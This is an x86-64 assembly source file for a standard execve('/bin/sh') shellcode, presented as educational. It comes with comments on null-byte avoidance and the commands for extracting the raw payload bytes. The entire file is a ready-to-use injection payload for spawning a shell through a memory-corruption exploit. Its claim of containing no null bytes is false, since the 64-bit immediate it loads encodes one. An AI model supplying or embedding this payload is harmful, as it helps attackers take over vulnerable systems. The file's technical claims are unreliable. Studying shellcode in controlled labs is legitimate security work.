; shellcode.asm - Basic /bin/sh Shellcode
; This is educational shellcode that spawns a shell
;
; Key concepts:
; 1. Position-independent code (no absolute addresses)
; 2. No null bytes (for injection)
; 3. Minimal size
;
; WARNING: Use only in controlled environments for learning!

section .text
    global _start

_start:
    ; execve("/bin/sh", NULL, NULL)
    ; syscall number 59
    
    ; Zero out registers
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    
    ; Build "/bin/sh" on the stack
    ; We push it backwards: "hs/nib/" then we'll reference it
    
    push rax            ; Push null terminator
    
    ; Push "/bin/sh" (8 bytes) - we need to do this cleverly
    mov rbx, 0x68732f6e69622f  ; "hs/nib/" in hex (little-endian)
    push rbx
    
    ; Now rsp points to "/bin/sh\0"
    mov rdi, rsp        ; rdi = pointer to "/bin/sh"
    
    ; Set up syscall
    mov al, 59          ; execve syscall number (using al to avoid null bytes)
    ; rsi and rdx are already NULL from above
    
    syscall

; Note: To extract shellcode bytes from this:
; nasm -f elf64 shellcode.asm -o shellcode.o
; ld shellcode.o -o shellcode
; objdump -d shellcode -M intel
; Or use: objcopy -O binary --only-section=.text shellcode shellcode.bin
